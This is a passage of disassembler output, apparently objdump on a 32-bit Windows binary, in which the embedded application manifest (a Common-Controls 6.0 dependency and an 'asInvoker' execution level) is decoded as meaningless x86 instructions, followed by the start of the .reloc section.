1101884d:	gs jo  0x110188b5
11018850:	outs   dx,BYTE PTR ds:[esi]
11018851:	fs outs dx,BYTE PTR gs:[esi]
11018854:	arpl   WORD PTR [ecx+0x3e],di
11018857:	or     eax,0x2020200a
1101885c:	and    BYTE PTR [esp+eiz*2],bh
1101885f:	gs jo  0x110188c7
11018862:	outs   dx,BYTE PTR ds:[esi]
11018863:	fs outs dx,BYTE PTR gs:[esi]
11018866:	je     0x110188a9
11018868:	jae    0x110188dd
1101886a:	gs ins DWORD PTR es:[edi],dx
1101886c:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
11018870:	or     eax,0x2020200a
11018875:	and    BYTE PTR [eax],ah
11018877:	and    BYTE PTR [ecx+eiz*2],bh
1101887a:	jae    0x110188ef
1101887c:	gs ins DWORD PTR es:[edi],dx
1101887e:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
11018882:	fs outs dx,BYTE PTR gs:[esi]
11018885:	je     0x110188f0
11018887:	je     0x11018902
11018889:	and    BYTE PTR [ecx+edi*2+0x70],dh
1101888d:	gs cmp eax,0x6e697722
11018893:	xor    esi,DWORD PTR [edx]
11018895:	and    ah,BYTE PTR [eax]
11018897:	outs   dx,BYTE PTR ds:[esi]
11018898:	popa   
11018899:	ins    DWORD PTR es:[edi],dx
1101889a:	gs cmp eax,0x63694d22
110188a0:	jb     0x11018911
110188a2:	jae    0x11018913
110188a4:	data16 je 0x110188d5
110188a7:	push   edi
110188a8:	imul   ebp,DWORD PTR [esi+0x64],0x2e73776f
110188af:	inc    ebx
110188b0:	outs   dx,DWORD PTR ds:[esi]
110188b1:	ins    DWORD PTR es:[edi],dx
110188b2:	ins    DWORD PTR es:[edi],dx
110188b3:	outs   dx,DWORD PTR ds:[esi]
110188b4:	outs   dx,BYTE PTR ds:[esi]
110188b5:	sub    eax,0x746e6f43
110188ba:	jb     0x1101892b
110188bc:	ins    BYTE PTR es:[edi],dx
110188bd:	jae    0x110188e1
110188bf:	and    BYTE PTR [esi+0x65],dh
110188c2:	jb     0x11018937
110188c4:	imul   ebp,DWORD PTR [edi+0x6e],0x2e36223d
110188cb:	xor    BYTE PTR [esi],ch
110188cd:	xor    BYTE PTR [esi],ch
110188cf:	xor    BYTE PTR [edx],ah
110188d1:	and    BYTE PTR [eax+0x72],dh
110188d4:	outs   dx,DWORD PTR ds:[esi]
110188d5:	arpl   WORD PTR [ebp+0x73],sp
110188d8:	jae    0x11018949
110188da:	jb     0x1101891d
110188dc:	jb     0x11018941
110188de:	push   0x63657469
110188e3:	je     0x1101895a
110188e5:	jb     0x1101894c
110188e7:	cmp    eax,0x20222a22
110188ec:	jo     0x11018963
110188ee:	bound  ebp,QWORD PTR [ecx+ebp*2+0x63]
110188f2:	dec    ebx
110188f3:	gs jns 0x1101894a
110188f6:	outs   dx,DWORD PTR ds:[esi]
110188f7:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
110188fb:	and    dh,BYTE PTR [esi]
110188fd:	xor    eax,0x36623539
11018902:	xor    al,0x31
11018904:	xor    al,0x34
11018906:	arpl   WORD PTR [ebx+0x66],sp
11018909:	xor    DWORD PTR [esi+eiz*2+0x22],esp
1101890d:	and    BYTE PTR [ecx+eiz*2+0x6e],ch
11018911:	addr16 jne 0x11018975
11018914:	addr16 gs cmp eax,0x3e222a22
1101891b:	cmp    al,0x2f
1101891d:	popa   
1101891e:	jae    0x11018993
11018920:	gs ins DWORD PTR es:[edi],dx
11018922:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
11018926:	fs outs dx,BYTE PTR gs:[esi]
11018929:	je     0x11018994
1101892b:	je     0x110189a6
1101892d:	ds or  eax,0x2020200a
11018933:	and    BYTE PTR [edi+ebp*1],bh
11018936:	fs gs jo 0x1101899f
1101893a:	outs   dx,BYTE PTR ds:[esi]
1101893b:	fs outs dx,BYTE PTR gs:[esi]
1101893e:	je     0x11018981
11018940:	jae    0x110189b5
11018942:	gs ins DWORD PTR es:[edi],dx
11018944:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
11018948:	or     eax,0x3c20200a
1101894d:	das    
1101894e:	fs gs jo 0x110189b7
11018952:	outs   dx,BYTE PTR ds:[esi]
11018953:	fs outs dx,BYTE PTR gs:[esi]
11018956:	arpl   WORD PTR [ecx+0x3e],di
11018959:	or     eax,0x3c20200a
1101895e:	je     0x110189d2
11018960:	jne    0x110189d5
11018962:	je     0x110189ad
11018964:	outs   dx,BYTE PTR ds:[esi]
11018965:	outs   dx,WORD PTR ds:[esi]
11018967:	and    BYTE PTR [eax+0x6d],bh
1101896a:	ins    BYTE PTR es:[edi],dx
1101896b:	outs   dx,BYTE PTR ds:[esi]
1101896c:	jae    0x110189ab
1101896e:	and    dh,BYTE PTR [ebp+0x72]
11018971:	outs   dx,BYTE PTR ds:[esi]
11018972:	cmp    dh,BYTE PTR [ebx+0x63]
11018975:	push   0x73616d65
1101897a:	sub    eax,0x7263696d
1101897f:	outs   dx,DWORD PTR ds:[esi]
11018980:	jae    0x110189f1
11018982:	data16 je 0x110189b2
11018985:	arpl   WORD PTR [edi+0x6d],bp
11018988:	cmp    ah,BYTE PTR [ecx+0x73]
1101898b:	ins    DWORD PTR es:[edi],dx
1101898c:	cs jbe 0x110189c2
1101898f:	and    bh,BYTE PTR [esi]
11018991:	or     eax,0x2020200a
11018996:	and    BYTE PTR [ebx+esi*2],bh
11018999:	arpl   WORD PTR gs:[ebp+0x72],si
1101899d:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a0d
110189a5:	and    BYTE PTR [eax],ah
110189a7:	and    BYTE PTR [eax],ah
110189a9:	cmp    al,0x72
110189ab:	gs jno 0x11018a23
110189ae:	gs jae 0x11018a25
110189b1:	gs fs push eax
110189b4:	jb     0x11018a1f
110189b6:	jbe    0x11018a21
110189b8:	ins    BYTE PTR es:[edi],dx
110189b9:	gs addr16 gs jae 0x110189fc
110189be:	or     eax,0x2020200a
110189c3:	and    BYTE PTR [eax],ah
110189c5:	and    BYTE PTR [eax],ah
110189c7:	and    BYTE PTR [edx+esi*2],bh
110189ca:	gs jno 0x11018a42
110189cd:	gs jae 0x11018a44
110189d0:	gs fs inc ebp
110189d3:	js     0x11018a3a
110189d5:	arpl   WORD PTR [ebp+0x74],si
110189d8:	imul   ebp,DWORD PTR [edi+0x6e],0x6576654c
110189df:	ins    BYTE PTR es:[edi],dx
110189e0:	and    BYTE PTR [ebp+eiz*2+0x76],ch
110189e4:	gs ins BYTE PTR es:[edi],dx
110189e6:	cmp    eax,0x49736122
110189eb:	outs   dx,BYTE PTR ds:[esi]
110189ec:	jbe    0x11018a5d
110189ee:	imul   esp,DWORD PTR [ebp+0x72],0x22
110189f2:	and    BYTE PTR [ebp+0x69],dh
110189f5:	inc    ecx
110189f6:	arpl   WORD PTR [ebx+0x65],sp
110189f9:	jae    0x11018a6e
110189fb:	cmp    eax,0x6c616622
11018a00:	jae    0x11018a67
11018a02:	and    bh,BYTE PTR [esi]
11018a04:	cmp    al,0x2f
11018a06:	jb     0x11018a6d
11018a08:	jno    0x11018a7f
11018a0a:	gs jae 0x11018a81
11018a0d:	gs fs inc ebp
11018a10:	js     0x11018a77
11018a12:	arpl   WORD PTR [ebp+0x74],si
11018a15:	imul   ebp,DWORD PTR [edi+0x6e],0x6576654c
11018a1c:	ins    BYTE PTR es:[edi],dx
11018a1d:	ds or  eax,0x2020200a
11018a23:	and    BYTE PTR [eax],ah
11018a25:	and    BYTE PTR [edi+ebp*1],bh
11018a28:	jb     0x11018a8f
11018a2a:	jno    0x11018aa1
11018a2c:	gs jae 0x11018aa3
11018a2f:	gs fs push eax
11018a32:	jb     0x11018a9d
11018a34:	jbe    0x11018a9f
11018a36:	ins    BYTE PTR es:[edi],dx
11018a37:	gs addr16 gs jae 0x11018a7a
11018a3c:	or     eax,0x2020200a
11018a41:	and    BYTE PTR [edi+ebp*1],bh
11018a44:	jae    0x11018aab
11018a46:	arpl   WORD PTR [ebp+0x72],si
11018a49:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a0d
11018a51:	cmp    al,0x2f
11018a53:	je     0x11018ac7
11018a55:	jne    0x11018aca
11018a57:	je     0x11018aa2
11018a59:	outs   dx,BYTE PTR ds:[esi]
11018a5a:	outs   dx,WORD PTR ds:[esi]
11018a5c:	ds or  eax,0x612f3c0a
11018a62:	jae    0x11018ad7
11018a64:	gs ins DWORD PTR es:[edi],dx
11018a66:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
11018a6a:	add    BYTE PTR [eax],al
11018a6c:	add    BYTE PTR [eax],al
	...

Disassembly of section .reloc:

1101a000 <.reloc>:
1101a000:	add    al,al
1101a002:	add    BYTE PTR [eax],al
1101a004:	or     al,0x0
1101a006:	add    BYTE PTR [eax],al
1101a008:	nop
1101a009:	cmp    al,BYTE PTR [eax]
	...
